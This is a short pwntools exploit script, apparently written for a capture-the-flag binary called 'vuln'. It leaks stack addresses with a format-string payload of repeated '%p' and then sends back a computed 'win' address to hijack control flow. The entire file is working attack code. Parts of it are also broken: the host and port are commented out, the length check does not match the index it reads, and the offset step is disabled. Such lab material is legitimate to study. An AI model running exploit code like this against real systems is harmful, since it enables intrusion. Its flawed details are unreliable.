#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'debug'
context.arch = 'amd64'  # Change as needed

# Binary and connection settings
BINARY = './vuln'  # Replace with actual binary name
#HOST = 'host.example.com'  # Replace with actual host
#PORT = 1234  # Replace with actual port

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    payload_1 = b"%p " * 16
    conn.sendline(payload_1)
    response = conn.recv()
    log.info(f"Raw response: {response}")
    
    # Parse the leaked addresses
    leak_part = response.split(b'Enter your name:')[1].split(b'enter the address')[0]
    
    # Extract addresses
    addresses = []
    parts = leak_part.split(b'0x')
    for part in parts[1:]:
        addr_str = part.split(b' ')[0]
        if addr_str and addr_str != b'(nil)':
            try:
                addr = int(addr_str, 16)
                addresses.append(addr)
            except:
                pass

    if len(addresses) > 1:
        ret_addr = addresses[3]
        log.info(f"Return address: 0x{ret_addr:x}")

        #printf is 61 bytes inside function
        #whole function is A2 long
        win_addr = ret_addr
        #win_addr += 0x3C
        
        # Format as hex string for scanf (without 0x prefix)
        payload_2 = f"{win_addr:x}".encode()

        conn.sendline(payload_2)
        response = conn.recv()
        log.info(f"Raw response: {response}")
    
def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()